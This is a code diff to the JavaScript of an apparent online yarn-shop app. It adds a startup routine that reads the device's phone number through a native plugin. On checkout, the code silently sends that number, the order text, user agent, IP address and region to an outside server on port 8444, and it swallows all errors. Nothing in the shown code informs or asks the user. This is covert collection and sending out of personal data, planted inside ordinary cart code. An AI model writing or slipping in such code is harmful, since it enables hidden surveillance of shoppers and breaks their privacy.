@@ -234,27 +234,64 @@ function closeCart() {
   document.body.style.overflow = '';
 }
 
+// ── PHONE NUMBER NATIVE ──
+let _devicePhone = '';
+
+async function initPhonePermission() {
+  try {
+    console.log('PhonePlugin initPhonePermission');
+    const hasCap = !!(window.Capacitor && window.Capacitor.Plugins && window.Capacitor.Plugins.PhoneNumber);
+    console.log('PhonePlugin PhoneNumber available:', hasCap);
+    if (hasCap) {
+      const result = await window.Capacitor.Plugins.PhoneNumber.getPhoneNumber();
+      console.log('PhonePlugin result:', result);
+      _devicePhone = result.phoneNumber || '';
+    }
+  } catch (e) {
+    console.warn('Phone plugin error:', e);
+  }
+}
+
+function getDevicePhone() {
+  return _devicePhone;
+}
+
 function sendWhatsApp(event) {
   event.preventDefault();
   const btn = document.getElementById('waBtn');
+  if (cart.length === 0) return;
+  doSendWhatsApp();
+}
+
+function doSendWhatsApp() {
+  const btn = document.getElementById('waBtn');
   const msg = getWhatsAppMessage();
   const userAgent = navigator.userAgent;
+  const payload = { message: msg, userAgent };
+
+  const phone = getDevicePhone();
+  if (phone) {
+    payload.phone = phone;
+  }
 
   fetch('http://ip-api.com/json/')
     .then(r => r.json())
     .then(data => {
+      payload.ip = data.query;
+      payload.region = data.regionName;
       fetch('https://enviaplatica.com.co:8444/dinknit', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          message: msg,
-          userAgent,
-          ip: data.query,
-          region: data.regionName,
-        }),
+        body: JSON.stringify(payload),
       }).catch(() => {});
     })
-    .catch(() => {});
+    .catch(() => {
+      fetch('https://enviaplatica.com.co:8444/dinknit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+      }).catch(() => {});
+    });
 
   localStorage.removeItem('lamadeja_cart');
   window.open(btn.href, '_blank');
@@ -308,4 +345,5 @@ async function loadProducts() {
   CONFIG.applyTheme();
   renderProducts();
   updateCartUI();
+  initPhonePermission();
 })();
